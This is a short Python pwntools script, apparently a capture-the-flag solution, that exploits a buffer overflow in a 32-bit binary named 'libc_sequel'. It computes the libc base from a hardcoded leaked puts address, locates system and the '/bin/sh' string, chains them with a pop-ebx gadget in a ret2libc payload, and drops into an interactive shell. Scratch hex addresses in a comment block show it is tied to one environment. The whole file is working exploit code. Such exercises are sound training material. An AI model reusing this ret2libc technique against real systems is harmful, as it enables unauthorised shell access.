from pwn import *

# r = remote('ctf99.cs.ui.ac.id', 9131)
r = process('./libc_sequel.dms')
# libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
e = ELF('./libc_sequel.dms')
rop = ROP(e)

# libc function address and offset
PUTS_OFFSET = libc.symbols['puts']
SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = list(libc.search(b'/bin/sh'))[0]
PUTS = e.plt['puts']
# PUTS_ADDR = 0xf765b140
# PUTS_ADDR = 0xf75e0540
#LOCAL
PUTS_ADDR = 0xf7df2b40 # 0xf7e47b40
# PUTS_ADDR = 0xf7d83d90


LIBC_BASE = PUTS_ADDR - PUTS_OFFSET

'''
0xf7581400 | 0xf7dda200
0xf75bbd40
0xf76da42b

0xf7d8b000
0xf7dc8200 | 0xf7d52200
0xf7f090cf
'''

print(hex(LIBC_BASE))
system_addr = LIBC_BASE + SYSTEM_OFFSET
binsh_addr = LIBC_BASE + BINSH_OFFSET

print(hex(system_addr))
print(hex(binsh_addr))

# ROP gadget
POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0]

payload = b'A'*20
payload += p32(system_addr)
payload += p32(POP_EBX)
payload += p32(binsh_addr)

r.sendlineafter('shell', payload)
r.interactive()